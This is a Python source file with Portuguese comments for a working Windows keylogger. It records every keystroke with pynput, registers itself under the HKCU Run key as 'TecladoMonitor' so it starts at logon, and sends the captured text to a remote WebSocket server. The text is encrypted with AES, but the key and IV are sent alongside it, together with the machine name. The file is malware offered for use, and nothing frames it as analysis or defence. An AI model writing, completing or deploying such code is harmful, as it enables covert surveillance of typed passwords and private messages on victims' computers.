import os
import sys
import threading
import base64
from pynput import keyboard
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
import secrets  # Para gerar chaves seguras
import winreg  # Para adicionar ao registro de inicialização
import socketio

# --- Configurações ---
SERVER_WS_URL = "ws:"  # URL do servidor WebSocket
LOG_CHARS_LIMIT = 50  # Quantidade máxima de teclas para enviar por vez

typed_chars = ""
log_data = ""
backend = default_backend()

# Cria cliente WebSocket
sio = socketio.Client()

try:
    sio.connect(SERVER_WS_URL)
    print("Conectado ao servidor WebSocket")
except Exception as e:
    print(f"Erro ao conectar WebSocket: {e}")

def limpar_log(raw_log):
    resultado = []
    i = 0
    while i < len(raw_log):
        if raw_log[i] == '[':  # começa um marcador tipo [space], [backspace]
            end = raw_log.find(']', i)
            if end == -1:
                # marcador não fechado, ignora e continua
                i += 1
                continue
            marcador = raw_log[i+1:end]

            if marcador == 'space':
                resultado.append(' ')
            elif marcador == 'backspace':
                if resultado:
                    resultado.pop()  # apaga último caractere
            # aqui você pode adicionar tratamento para outros marcadores, se quiser
            # senão ignora os demais

            i = end + 1
        else:
            resultado.append(raw_log[i])
            i += 1
    return ''.join(resultado)

def encrypt_text(text, key, iv):
    cipher = Cipher(algorithms.AES(key), modes.CFB(iv), backend=backend)
    encryptor = cipher.encryptor()
    encrypted = encryptor.update(text.encode('utf-8')) + encryptor.finalize()
    return base64.b64encode(encrypted).decode('utf-8')

def enviar_log(log):
    log_limpo = limpar_log(log)  # chama a função que limpa o texto
    key = secrets.token_bytes(16)  # AES-128
    iv = secrets.token_bytes(16)
    log_encrypted = encrypt_text(log_limpo, key, iv)

    payload = {
        "ip_local": os.getenv("COMPUTERNAME", "unknown"),
        "log_encrypted": log_encrypted,
        "key": base64.b64encode(key).decode('utf-8'),
        "iv": base64.b64encode(iv).decode('utf-8')
    }

    try:
        sio.emit('send_log', payload)
        print("Log enviado via WebSocket")
    except Exception as e:
        print(f"Erro ao enviar log: {e}")

def adicionar_ao_inicio(nome, caminho_executavel):
    chave = r"Software\Microsoft\Windows\CurrentVersion\Run"
    try:
        reg = winreg.ConnectRegistry(None, winreg.HKEY_CURRENT_USER)
        chave_reg = winreg.OpenKey(reg, chave, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(chave_reg, nome, 0, winreg.REG_SZ, caminho_executavel)
        winreg.CloseKey(chave_reg)
        print("Adicionado ao registro de inicialização.")
    except Exception as e:
        print(f"Erro ao adicionar ao registro: {e}")

def on_press(key):
    global typed_chars, log_data

    try:
        typed_chars += key.char
        log_data += key.char
    except AttributeError:
        log_data += f"[{key.name if hasattr(key, 'name') else str(key)}]"

    # Limita tamanho das strings para não crescer demais
    if len(typed_chars) > LOG_CHARS_LIMIT:
        typed_chars = typed_chars[-LOG_CHARS_LIMIT:]
    if len(log_data) > LOG_CHARS_LIMIT:
        # Envia e limpa o log
        enviar_log(log_data)
        log_data = ""

if __name__ == "__main__":
    caminho_exe = sys.executable
    adicionar_ao_inicio("TecladoMonitor", caminho_exe)

    # Inicia escuta do teclado
    listener = keyboard.Listener(on_press=on_press)
    listener.start()
    listener.join()
